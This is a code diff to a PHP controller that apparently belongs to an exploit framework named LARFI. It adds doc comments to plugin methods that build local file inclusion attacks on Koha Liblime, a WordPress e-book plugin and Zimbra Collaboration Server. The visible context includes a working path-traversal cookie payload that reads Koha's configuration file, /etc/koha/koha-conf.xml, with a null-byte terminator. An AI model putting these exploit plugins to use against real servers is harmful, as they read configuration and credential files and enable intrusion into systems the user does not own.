@@ -10,13 +10,24 @@
         @url : http://munir.skilledsoft.com
  **/
 namespace Controller;
-
+/**
+ * Creates Exploits based on LARFI
+ * Class Lfiplugins
+ * @package Controller
+ */
 class Lfiplugins extends Larfi {
+    /**
+     * Initialize the View
+     */
 	public function beforeroute() {
 		$this->response = new \View\Backend();
 		$this->response->data['LAYOUT'] = 'larfi_layout.html';
 	}
-	
+
+    /**
+     * Koha Cookie Based LFI Example
+     * @param \Base $f3
+     */
 	public function koha_lfi(\Base $f3){
 		$lfi=new Larfi();
 		$f3->set('exploit_title', 'Koha Liblime <= 4.2');
@@ -27,6 +38,11 @@ class Lfiplugins extends Larfi {
 		$payload="KohaOpacLanguage=../../../../../../../../etc/koha/koha-conf.xml%00";
 		return $this->cookie_based_lfi($method,$blankurl,$url,$payload);
 	}
+
+    /**
+     * Wordpress Aspose E-Book Generator URIL Based LFI
+     * @param \Base $f3
+     */
 	public function wordpress_lfi(\Base $f3){
 		$lfi=new Larfi();
 		$f3->set('exploit_title', 'Wordpress E-Book Generator LFI');
@@ -38,6 +54,11 @@ class Lfiplugins extends Larfi {
 		return $this->uri_based_lfi($blankurl,$url,$payload);
 
 	}
+
+    /**
+     * Zimbra Collaboration Server URI Based LFI
+     * @param \Base $f3
+     */
 	public function zimbra_lfi(\Base $f3){
 		$lfi=new Larfi();
 		$f3->set('exploit_title', 'Zimbra Collaboration server LFI (Versions: <=7.2.2 and <=8.0.2 )');
